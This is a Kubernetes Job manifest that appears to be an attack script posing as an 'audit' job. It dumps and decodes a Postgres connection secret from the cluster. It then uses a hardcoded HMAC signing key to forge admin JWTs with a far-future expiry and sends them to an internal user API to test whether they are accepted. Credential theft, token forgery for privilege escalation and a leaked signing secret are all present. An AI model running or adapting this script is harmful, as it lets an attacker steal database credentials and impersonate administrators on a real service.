apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v20
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          echo "=POSTGRES_SECRET="
          kubectl get secret postgres-connection-secrets -n default -o jsonpath='{.data}' | tr ',' '\n'
          
          echo ""
          echo "=POSTGRES_SECRET_DECODED="
          kubectl get secret postgres-connection-secrets -n default -o go-template='{{range $k,$v := .data}}{{$k}}={{$v | base64decode}}{{"\n"}}{{end}}'
          
          echo "=FORGE_JWT_TEST="
          # Forge JWT using openssl HMAC-SHA256 from Linux
          SECRET="b9e2881d706461152371f6389962817a70c3e69dfc70166c53227c99a2711cc6"
          
          # Different JWT payloads to test
          for PAYLOAD in \
            '{"sub":"admin@tachyus.com","exp":9999999999}' \
            '{"sub":"admin","exp":9999999999}' \
            '{"sub":"admin@tachyus.com","exp":9999999999,"type":"access"}' \
            '{"sub":"admin@tachyus.com","exp":9999999999,"username":"admin"}'; do
            
            H=$(printf '{"alg":"HS256","typ":"JWT"}' | openssl base64 -A | tr -d '=' | tr '+/' '-_')
            P=$(printf '%s' "$PAYLOAD" | openssl base64 -A | tr -d '=' | tr '+/' '-_')
            SIG=$(printf '%s.%s' "$H" "$P" | openssl dgst -sha256 -hmac "$SECRET" -binary | openssl base64 -A | tr -d '=' | tr '+/' '-_')
            JWT="${H}.${P}.${SIG}"
            
            echo "Testing payload: $PAYLOAD"
            RESULT=$(curl -sk -X GET "http://dune-api.dune-api.svc.cluster.local:3000/v1/users/me" \
              -H "Authorization: Bearer $JWT")
            echo "Result: $RESULT"
            echo "---"
          done
          
          sleep 60